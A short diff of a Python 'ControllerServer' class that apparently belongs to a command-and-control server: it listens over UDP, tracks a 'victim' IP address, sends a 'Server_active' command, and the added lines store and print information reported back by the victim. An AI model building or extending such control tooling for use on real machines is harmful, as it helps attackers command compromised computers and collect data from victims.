@@ -102,6 +102,8 @@ class ControllerServer:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
                         print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
+                        self.info_victim = data_str
+                        print(data_str)
 
                     if signal:
                         self.buffer += data_str
